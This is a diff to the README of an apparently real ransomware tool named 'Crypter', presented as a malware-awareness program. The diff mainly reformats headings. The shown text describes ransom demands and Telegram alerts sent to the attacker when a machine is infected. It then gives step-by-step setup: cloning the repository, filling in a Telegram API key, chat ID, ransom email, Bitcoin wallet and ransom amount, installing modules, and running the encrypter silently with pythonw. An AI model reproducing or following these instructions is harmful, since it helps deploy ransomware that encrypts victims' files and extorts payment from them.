@@ -30,12 +30,12 @@ The purpose of this program is to promote understanding and awareness of malware
 - Ransom Demand: Ransomware displays a message demanding the victim pay a ransom fee in exchange for a decryption key.
 - Telegram API: Ransomware might integrate with the Telegram API to notify the hacker when a new computer is infected.
 
-
-- Download Crypter \
+## Usage:
+### Download Crypter 
 ```git clone https://github.com/APT3233/Crypter.git```
-- Move to folder \
+### Move to folder 
 ```cd Crypter```
-- Fill in the following information
+### Fill in the following information
 ```init
 self.api = 'YOUR_API'
 self.chat_id = 'YOUR_CHAT_ID'
@@ -44,9 +44,10 @@ self.ransomware_email_address = 'THANK@YOU.COM'
 self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
 self.ransomware_amount_of_money = "AMOUNT_OF_MONEY"
 ```
-- Install Modules \ 
+
+### Install Modules 
 ```pip install -r requirements.txt```
-- Run file \
+### Run file 
 ```pythonw Encrypter.py```
 
 
